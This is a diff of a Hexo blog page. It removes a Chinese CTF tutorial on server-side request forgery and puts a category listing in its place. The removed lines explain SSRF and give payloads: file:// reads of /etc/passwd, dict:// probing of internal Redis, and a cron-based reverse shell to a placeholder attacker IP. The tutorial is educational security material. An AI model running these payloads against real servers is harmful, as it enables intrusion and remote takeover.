@@ -13,27 +13,18 @@
     
     <!--- Seo Part-->
     
-    <link rel="canonical" href="http://example.com/2024/09/11/服务器请求伪造（ssrf）/"/>
+    <link rel="canonical" href="http://example.com/categories/simple/"/>
     <meta name="robots" content="index,follow">
     <meta name="googlebot" content="index,follow">
     <meta name="revisit-after" content="1 days">
     
-        <meta name="description" content="SSRF漏洞漏洞介绍服务器请求是从客户端发起一个请求到服务器，服务器再向另外的服务器发起请求的过程。 服务器端清求伪造(Server-side Request Forgery，简称SSRF)，是一种由攻击者构造形成由服务器端发起请求的一个漏洞。SSRF让服务器去请求你通常请求不到的东西，一般用来在外网探测或攻击内网服务。	    **类比CSRF:**服务器端请求伪造攻击将域中的不安全服务器作为代">
-<meta property="og:type" content="article">
-<meta property="og:title" content="服务器请求伪造（SSRF）">
-<meta property="og:url" content="http://example.com/2024/09/11/%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%EF%BC%88SSRF%EF%BC%89/index.html">
+        <meta property="og:type" content="website">
+<meta property="og:title" content="Hexo">
+<meta property="og:url" content="http://example.com/categories/simple/index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="SSRF漏洞漏洞介绍服务器请求是从客户端发起一个请求到服务器，服务器再向另外的服务器发起请求的过程。 服务器端清求伪造(Server-side Request Forgery，简称SSRF)，是一种由攻击者构造形成由服务器端发起请求的一个漏洞。SSRF让服务器去请求你通常请求不到的东西，一般用来在外网探测或攻击内网服务。	    **类比CSRF:**服务器端请求伪造攻击将域中的不安全服务器作为代">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="c:\Users\%E9%99%88%E6%80%A1%E7%94%BA\AppData\Roaming\Typora\typora-user-images\image-20240505105303580.png">
-<meta property="og:image" content="c:\Users\%E9%99%88%E6%80%A1%E7%94%BA\AppData\Roaming\Typora\typora-user-images\image-20240505105319353.png">
-<meta property="article:published_time" content="2024-09-11T10:56:23.000Z">
-<meta property="article:modified_time" content="2024-09-11T11:05:39.572Z">
 <meta property="article:author" content="John Doe">
-<meta property="article:tag" content="ctf">
-<meta property="article:tag" content="SSRF">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="c:\Users\%E9%99%88%E6%80%A1%E7%94%BA\AppData\Roaming\Typora\typora-user-images\image-20240505105303580.png">
     
     
         <!-- Google tag (gtag.js) -->
@@ -55,7 +46,7 @@
     
     <title>
         
-            服务器请求伪造（SSRF） -
+            Category: simple -
         
         Dunm1e&#39;World
     </title>
@@ -508,281 +499,45 @@
             <div class="main-content">
 
                 
-                    <div class="post-page-container flex relative justify-between box-border w-full h-full">
-    <div class="article-content-container">
-
-        <div class="article-title relative w-full">
-            
-                <div class="w-full flex items-center pt-6 justify-start">
-                    <h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">服务器请求伪造（SSRF）</h1>
-                </div>
-            
-            </div>
-
-        
-            <div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
-                <div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
-                    <img src="/images/touxiang.png">
-                </div>
-                <div class="info flex flex-col justify-between">
-                    <div class="author flex items-center">
-                        <span class="name text-default-text-color text-lg font-semibold">Dunm1e</span>
-                        
-                            <span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv2</span>
-                        
-                    </div>
-                    <div class="meta-info">
-                        <div class="article-meta-info">
-    <span class="article-date article-meta-item">
-        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
-        <span class="desktop">2024-09-11 18:56:23</span>
-        <span class="mobile">2024-09-11 18:56:23</span>
-        <span class="hover-info">Created</span>
-    </span>
-    
-        <span class="article-date article-meta-item">
-            <i class="fa-regular fa-wrench"></i>&nbsp;
-            <span class="desktop">2024-09-11 19:05:39</span>
-            <span class="mobile">2024-09-11 19:05:39</span>
-            <span class="hover-info">Updated</span>
-        </span>
-    
-
-    
-        <span class="article-categories article-meta-item">
-            <i class="fa-regular fa-folders"></i>&nbsp;
-            <ul>
-                
-                
-                    
-                        
-                        <li>
-                            <a href="/categories/Web/">Web</a>&nbsp;
-                        </li>
-                    
-                    
-                
-                    
-                        
-                            <li>></li>
-                        
-                        <li>
-                            <a href="/categories/Web/ctf/">ctf</a>&nbsp;
-                        </li>
-                    
-                    
-                
-            </ul>
-        </span>
-    
-    
-        <span class="article-tags article-meta-item">
-            <i class="fa-regular fa-tags"></i>&nbsp;
-            <ul>
-                
-                    <li>
-                        <a href="/tags/ctf/">ctf</a>&nbsp;
-                    </li>
-                
-                    <li>
-                        | <a href="/tags/SSRF/">SSRF</a>&nbsp;
-                    </li>
-                
-            </ul>
-        </span>
-    
-
-    
-    
-        <span class="article-wordcount article-meta-item">
-            <i class="fa-regular fa-typewriter"></i>&nbsp;<span>1.7k Words</span>
-        </span>
-    
-    
-        <span class="article-min2read article-meta-item">
-            <i class="fa-regular fa-clock"></i>&nbsp;<span>6 Mins</span>
-        </span>
-    
-    
-        <span class="article-pv article-meta-item">
-            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
-        </span>
-    
-</div>
-
-                    </div>
-                </div>
-            </div>
-        
-
-        
-
-
-        <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
-            <h1 id="SSRF漏洞"><a href="#SSRF漏洞" class="headerlink" title="SSRF漏洞"></a>SSRF漏洞</h1><h2 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h2><p><strong>服务器请求</strong>是从客户端发起一个请求到服务器，服务器再向另外的服务器发起请求的过程。</p>
-<p><strong>服务器端清求伪造</strong>(Server-side Request Forgery，简称SSRF)，是一种由攻击者构造形成由服务器端发起请求的一个漏洞。SSRF让服务器去请求你通常请求不到的东西，一般用来在外网探测或攻击内网服务。	 </p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="C:\Users\陈怡町\AppData\Roaming\Typora\typora-user-images\image-20240505105303580.png"
-                      alt="image-20240505105303580"
-                ></p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="C:\Users\陈怡町\AppData\Roaming\Typora\typora-user-images\image-20240505105319353.png"
-                      alt="image-20240505105319353"
-                ></p>
-<p>**类比CSRF:**服务器端请求伪造攻击将域中的不安全服务器作为代理使用，这与利用网页客户端的跨站请求伪造攻击类似(如处在域中的浏览器可作为攻击者的代理)。<br>**漏洞成因:**由于服务端提供了从其他服务器应用获取数据的功能，但又没有对目标地址做严格过滤与限制，导致攻击者可以传入任意的地址来让后端服务器对其发送请求，并返回对该目标地址请求的数据。比如:攻击者传入一个未经验证的 URL，后端代码直接请求这个URL，就会造成 SSRF 漏洞。<br>**漏洞危害:**利用SSRF漏洞，攻击者实际上可以访问内网，可以进行</p>
-<ul>
-<li>读取内网文件;</li>
-<li>扫描内网服务和端口;</li>
-<li>收集内网 web 应用的指纹识别，根据这些信息进行下一步的渗透:</li>
-<li>攻击运行在内网的系统或应用程序.</li>
-</ul>
-<h2 id="漏洞发现"><a href="#漏洞发现" class="headerlink" title="漏洞发现"></a>漏洞发现</h2><p><strong>漏洞点：</strong>能够对外发起网络请求的服务器，就可能存在SSRF漏洞</p>
-<p><strong>web功能</strong></p>
-<p>服务器端请求伪造漏洞是在服务端获取其他服务器的相关信息的功能中形成的，因此我们可以列举几种在web应用中常见的从服务端获取其他服务器信息的的功能:</p>
-<ol>
-<li>分享URL:通过目标URL地址获取了title标签和相关文本内容，而如果在此功能中没有对目标地址的范围做过滤与限制则就存在着SSRF漏洞。</li>
-<li>转码服务:通过URL地址把原地址的网页内容调优使其适合手机屏幕浏览。</li>
-<li>在线翻译:通过URL地址翻译对应文本的内容。提供此功能的国内公司有百度、有道等。</li>
-<li>图片加载与下载:通过URL地址加载或下载图片。</li>
-<li>通过api获取远程地址文件来加载内容。</li>
-</ol>
-<p><strong>URL关键字</strong></p>
-<p>寻找需要加载外部资源的URL，可能存在SSRF漏洞。这些URL中经常包含的关键词有<code>share、wap、ur1、link、src、source、target、u、3g、display、sourceURL、imageURL、domain</code>等利用 google 语法(inurl:url&#x3D;)加上这些关键字去寻找 SSRF 漏洞，耐心的验证，可以找到存在的 SSRF漏洞。</p>
-<p><strong>判断漏洞是否存在：</strong>在目标网站上攻击者IP，如果攻击的服务器日志能看到目标服务器对自己发起的请求，说明存在漏洞。</p>
-<h2 id="SSRF利用"><a href="#SSRF利用" class="headerlink" title="SSRF利用"></a>SSRF利用</h2><h3 id="1-读取敏感文件"><a href="#1-读取敏感文件" class="headerlink" title="1. 读取敏感文件"></a>1. 读取敏感文件</h3><p>**file协议:**本地文件传输协议，用于访问本地计算机中的文件。好比通过Windows的资源管理器中打开文件或者通过右键单击打开一样。格式:file:&#x2F;&#x2F;filepath</p>
-<p><strong>重要文件：</strong></p>
-<ol>
-<li>&#x2F;etc&#x2F;passwd:在Linux中，&#x2F;etc&#x2F;passwd文件中一行记录对应着一个用户，每行记录又被冒号(:)分隔为7个字段:<code>用户名:口令:用户标识号:组标识号:注释性描述:主目录:登录 shell</code></li>
-<li>&#x2F;etc&#x2F;shadow:用于存储 Linux 系统中用户的密码信息，只有 root 用户拥有读权限，其他用户没有任何权限。</li>
-<li>&#x2F;etc&#x2F;hosts:在linux中，主要作用是定义IP地址和主机名的映射关系，是一个映射IP地址和主机名的规定。可以用文本文件打开!当用户在浏览器中输入一个网址时，系统会首先自动从hosts文件中寻找对应的IP地址，一旦找到，浏览器会立即打开对应网页，如果没有找到，则浏览器会将网址提交DNS服务器进行IP地址解析。</li>
-</ol>
-<h3 id="2-探测内网服务"><a href="#2-探测内网服务" class="headerlink" title="2. 探测内网服务"></a>2. 探测内网服务</h3><p>**dict协议:**一个字典服务器协议，在ssrf中常用于探测日标服务器端口上运行的服务版本信息。格式:dict:&#x2F;&#x2F;ip:port。先利用file协议读取&#x2F;etc&#x2F;hosts获取ip，通过 dict 协议读取目标服务器端口上运行的服务版本信息</p>
-<p>探测内网存活IP和开放端口:可利用BurpSuite，批量探测存活IP和开放端口。</p>
-<ol>
-<li><p>开启Burpsuite，并访问待测试的网站:<a class="link"   target="_blank" rel="noopener" href="http://120.27.61.239:8006/source/index.php" >http://120.27.61.239:8006/source/index.php <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>;</p>
-</li>
-<li><p>将抓到的包发送到Intruder模块，设置IP或者端口，进行爆破;</p>
-</li>
-</ol>
-<p><strong>探测内网redis：</strong>REmote Dlctionary Server(Redis)是一个由 Salvatore Sanfilippo 写的 key-value 存储系统，是跨平台的非关系型数据库。Redis一般绑定在本地(不允许远程访问)，默认不开启认证，默认端口为6379。如果在没有开启认证的情况下，可以导致任意用户利用ssrf漏洞攻击内网中的未授权Redis以及读取Redis的数据。使用dict:&#x2F;&#x2F;127.0.0.1:6379 有返回信息，说明存在redis数据库</p>
-<p>同样可以利用Burp进行爆破</p>
-<h3 id="3-攻击内网应用"><a href="#3-攻击内网应用" class="headerlink" title="3. 攻击内网应用"></a>3. 攻击内网应用</h3><p>攻击者在未授权访问Redis的情况下可以利用Redis的相关方法，如果运行redis 的用户是root 用户，攻击者可以通过写<strong>定时任务</strong>的方式进行反弹shell。<br>定时任务类似日常生活之中的闹钟，主要用于定时执行某些命令，达到定时处理数据的作用。不同的系统定时任务保存位置不一样，比如:<br>centos(cat &#x2F;etc&#x2F;redhat-release)，在&#x2F;var&#x2F;spool&#x2F;cron&#x2F;日录下;<br>ubuntu(cat &#x2F;etc&#x2F;lsb-release)，在&#x2F;var&#x2F;spool&#x2F;cron&#x2F;crontabs&#x2F; 目录下。</p>
-<p><strong>攻击payload:</strong></p>
-<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">dict://127.0.0.1:6379/info //查看信息</span><br><span class="line">dict://127.0.0.1:6379/flusha11 //清空数据库(慎用)</span><br><span class="line">dict://127.0.0.1:6379/config set dir /var/spoo1/cron/ //设置工作目录</span><br><span class="line">dict://127.0.0.1:6379/config set dbfilename root //设置备份文件名</span><br><span class="line">dict://127.0.0.1:6379/set x &quot;\n***** bash -i &amp;&gt; /dev/tcp/攻击机IP/port 0&gt;&amp;1\n&quot;//反弹she11</span><br><span class="line">dict://127.0.0.1:6379/save</span><br></pre></td></tr></table></figure></div>
-
-<p>然后攻击机进行监听</p>
-<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvpp port</span><br></pre></td></tr></table></figure></div>
-
-<p>定时任务执行后就会反弹shell到攻击机</p>
-
-        </div>
-
-        
-            <div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
-                <div class="article-copyright-info-container">
-    <ul>
-        <li><strong>Title:</strong> 服务器请求伪造（SSRF）</li>
-        <li><strong>Author:</strong> Dunm1e</li>
-        <li><strong>Created at
-                :</strong> 2024-09-11 18:56:23</li>
-        
-            <li>
-                <strong>Updated at
-                    :</strong> 2024-09-11 19:05:39
-            </li>
-        
-        <li>
-            <strong>Link:</strong> https://dunm1e.github.io/2024/09/11/服务器请求伪造（SSRF）/
-        </li>
-        <li>
-            <strong>
-                License:
-            </strong>
-            
-
-            
-                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
-            
-        </li>
-    </ul>
-</div>
-
-            </div>
-        
-
-        
-            <ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
-                
-                    <li class="tag-item mx-0.5">
-                        <a href="/tags/ctf/">#ctf</a>&nbsp;
-                    </li>
-                
-                    <li class="tag-item mx-0.5">
-                        <a href="/tags/SSRF/">#SSRF</a>&nbsp;
-                    </li>
-                
-            </ul>
-        
-
-        
-
-        
-            <div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
-                
-                    <div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
-                        <a class="prev"
-                        rel="prev"
-                        href="/2024/09/11/ctf-%E5%9F%BA%E6%9C%AC%E6%80%9D%E8%B7%AF/"
-                        >
-                            <span class="left arrow-icon flex justify-center items-center">
-                                <i class="fa-solid fa-chevron-left"></i>
-                            </span>
-                            <span class="title flex justify-center items-center">
-                                <span class="post-nav-title-item">ctf 基本思路</span>
-                                <span class="post-nav-item">Prev posts</span>
-                            </span>
-                        </a>
-                    </div>
-                
-                
-                    <div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
-                        <a class="next"
-                        rel="next"
-                        href="/2024/09/11/ssh%E5%AF%86%E9%92%A5%E6%B3%84%E9%9C%B2/"
-                        >
-                            <span class="title flex justify-center items-center">
-                                <span class="post-nav-title-item">ssh密钥泄露</span>
-                                <span class="post-nav-item">Next posts</span>
-                            </span>
-                            <span class="right arrow-icon flex justify-center items-center">
-                                <i class="fa-solid fa-chevron-right"></i>
-                            </span>
-                        </a>
-                    </div>
-                
-            </div>
-        
-
-
-        
+                    <div class="category-container">
+    <div class="category-name">
+        <i class="fa-solid fa-folder"></i>&nbsp;simple
     </div>
-
+    <div class="category-post-list">
+        
+<div class="archive-list-container">
     
-        <div class="toc-content-container">
-            <div class="post-toc-wrap">
-    <div class="post-toc">
-        <div class="toc-title">On this page</div>
-        <div class="page-title">服务器请求伪造（SSRF）</div>
-        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#SSRF%E6%BC%8F%E6%B4%9E"><span class="nav-text">SSRF漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E4%BB%8B%E7%BB%8D"><span class="nav-text">漏洞介绍</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0"><span class="nav-text">漏洞发现</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SSRF%E5%88%A9%E7%94%A8"><span class="nav-text">SSRF利用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E8%AF%BB%E5%8F%96%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6"><span class="nav-text">1. 读取敏感文件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E6%8E%A2%E6%B5%8B%E5%86%85%E7%BD%91%E6%9C%8D%E5%8A%A1"><span class="nav-text">2. 探测内网服务</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-%E6%94%BB%E5%87%BB%E5%86%85%E7%BD%91%E5%BA%94%E7%94%A8"><span class="nav-text">3. 攻击内网应用</span></a></li></ol></li></ol></li></ol>
+        <section class="archive-item mb-spacing-unit last:mb-0">
+            <div class="archive-item-header flex flex-row items-center mb-2">
+                <span class="archive-year font-semibold text-3xl mr-2">2024</span>
+                <span class="archive-year-post-count text-xs md:text-sm font-bold rounded-small bg-third-background-color py-[2px] px-[10px] border border-border-color">1</span>
+            </div>
+            
+            <ul class="article-list pl-0 md:pl-8 text-lg leading-[1.5]">
+                
+                    
+                    
+                         <!-- Close the previous LI if not the first item -->
+                        <li class="article-item space-y-2 px-6 pt-10 pb-2 text-xl relative border-l-2 border-border-color" date-is='09-11'>
+                    
+                    <a href="/2024/09/11/%E4%B8%87%E8%83%BD%E7%99%BB%E9%99%86%E5%AF%86%E7%A0%81/" class="block w-fit">
+                        <span class="article-title my-0.5 text-2xl">万能登陆密码</span>
+                    </a>
+                    
+                
+                </li> <!-- Ensure the last item is properly closed -->
+            </ul>
+        </section>
+    
+</div>
 
     </div>
 </div>
-        </div>
-    
+<div class="category-paginator">
+    <div class="paginator">
+    <span class="page-number current">1</span>
+</div>
+
 </div>
 
 
@@ -873,23 +628,6 @@
         </div>
     </div>
 
-    
-        <div class="post-tools">
-            <div class="post-tools-container">
-    <ul class="article-tools-list">
-        <!-- TOC aside toggle -->
-        
-            <li class="right-bottom-tools page-aside-toggle">
-                <i class="fa-regular fa-outdent"></i>
-            </li>
-        
-
-        <!-- go comment -->
-        
-    </ul>
-</div>
-
-        </div>
     
 
     <div class="right-side-tools-container">
